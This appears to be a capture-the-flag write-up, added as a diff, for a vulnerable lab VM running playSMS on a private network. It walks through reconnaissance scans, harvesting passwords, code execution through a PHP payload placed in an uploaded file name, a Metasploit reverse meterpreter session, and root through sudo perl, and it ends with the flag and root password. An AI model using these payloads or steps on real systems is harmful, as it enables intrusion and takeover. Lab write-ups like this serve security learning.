@@ -1,0 +1,175 @@
+$ sudo netdiscover -i wlp2s0
+
+192.168.1.9
+
+$ nmap -sV 192.168.1.9 -sV -p- -T5 -Pn
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
+
+
+
+$ nmap -A 192.168.1.9 -Pn -T5
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
+| http-robots.txt: 5 disallowed entries 
+|_/ange1 /angel1 /nothing /tmp /uploads
+|_http-server-header: Apache/2.2.22 (Ubuntu)
+|_http-title: Dina
+
+
+$ nikto -h http://192.168.1.9/
+
++ Server: Apache/2.2.22 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, inode: 425463, size: 3618, mtime: 0x55bbe5b06c6c7
++ The anti-clickjacking X-Frame-Options header is not present.
++ OSVDB-3268: /ange1/: Directory indexing found.
++ File/dir '/ange1/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ OSVDB-3268: /angel1/: Directory indexing found.
++ File/dir '/angel1/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ OSVDB-3268: /tmp/: Directory indexing found.
++ File/dir '/tmp/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ OSVDB-3268: /uploads/: Directory indexing found.
++ File/dir '/uploads/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
++ "robots.txt" contains 5 entries which should be manually viewed.
++ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
++ OSVDB-3268: /secure/: Directory indexing found.
++ OSVDB-3092: /tmp/: This might be interesting...
++ OSVDB-3233: /icons/README: Apache default file found.
++ 6544 items checked: 0 error(s) and 15 item(s) reported on remote host
++ End Time:           2020-04-30 00:47:12 (GMT3) (7 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) teste
+
+
+$ dirb http://192.168.1.9/
+
+---- Scanning URL: http://192.168.1.9/ ----
++ http://192.168.1.9/cgi-bin/ (CODE:403|SIZE:287)                              
++ http://192.168.1.9/index (CODE:200|SIZE:3618)                                
++ http://192.168.1.9/index.html (CODE:200|SIZE:3618)                           
++ http://192.168.1.9/robots (CODE:200|SIZE:102)                                
++ http://192.168.1.9/robots.txt (CODE:200|SIZE:102)                            
+==> DIRECTORY: http://192.168.1.9/secure/                                      
++ http://192.168.1.9/server-status (CODE:403|SIZE:292)                         
+==> DIRECTORY: http://192.168.1.9/tmp/                                         
+==> DIRECTORY: http://192.168.1.9/uploads/ 
+
+
+
+lets go to http://192.168.1.9/robots.txt
+
+User-agent: *
+Disallow: /ange1
+Disallow: /angel1
+Disallow: /nothing
+Disallow: /tmp
+Disallow: /uploads
+
+there is nothing in ange1 and angel2
+
+in the source page on /nothing directory I found this
+
+<!--
+#my secret pass
+freedom
+password
+helloworld!
+diana
+iloveroot
+-->
+
+also in /secure directory that dirb has found there is a zip file
+
+downlaod that zip file , it is password protected and we will use passwords we found in
+/nothing directory
+
+password is freedom 
+extract file inside zip file
+
+and try to read it
+
+$ strings backup-cred.mp3 
+
+I am not toooo smart in computer .......dat the resoan i always choose easy password...with creds backup file....
+uname: touhid
+password: ******
+url : /SecreTSMSgatwayLogin
+
+we found a secret login page
+
+lets go to the secret url
+
+and wee see login page 
+I tried touhid with password combinations and I found thath password is diana
+
+no we go to the admin panel of playSMS page
+
+After a little bit of googling I found https://touhidshaikh.com/blog/2017/05/playsms-v1-4-rce/
+
+about rce in playsms
+
+it is in file name
+
+ go to accound->send from file
+ create a file named  file.<?php system("id");?>.png
+ 
+ upload the file 
+ 
+ and you see that we executed the code
+
+I tried a lot to get a reverse shell from filename but I wasnt able to do
+
+so I decided to use metasploit to exploit this vulnerability
+
+$ msfconsole 
+$ search playsms
+
+and with use command select the exploit to use
+
+$ set PASSWORD diana
+$ set USERNAME touhid
+$ set RHOST 192.168.1.9
+$ set LHOST 192.168.1.67
+$ set TARGETURI /SecreTSMSgatwayLogin
+
+and finally $ run
+
+now we meterpreter
+
+to use a system shell 
+type shell
+ 	
+
+
+first thing I do is to run $ sudo -l
+
+
+Matching Defaults entries for www-data on this host:
+    env_reset,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User www-data may run the following commands on this host:
+    (ALL) NOPASSWD: /usr/bin/perl
+
+this means we can use sudo command with  perl to get a shell
+
+sudo perl -e 'exec("/bin/bash")'
+whoami 
+root
+
+cd /root
+cat flag.txt
+
+root password is : hello@3210
+easy one .....but hard to guess.....
+but i think u dont need root password......
+u already have root shelll....
+
+
+CONGO.........
+FLAG : 22d06624cd604a0626eb5a2992a6f2e6
+
+ 
+
